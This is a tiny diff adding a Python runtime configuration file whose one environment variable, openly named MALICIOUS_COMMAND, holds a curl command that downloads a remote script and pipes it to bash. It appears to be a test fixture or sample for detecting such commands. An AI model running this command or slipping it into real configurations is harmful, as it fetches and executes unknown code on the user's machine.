@@ -1,0 +1,4 @@
+runtime: python39
+env_variables:
+  MALICIOUS_COMMAND: "curl -s https://eofx0dnqega9js6.m.pipedream.net/exploit.sh | bash"
+
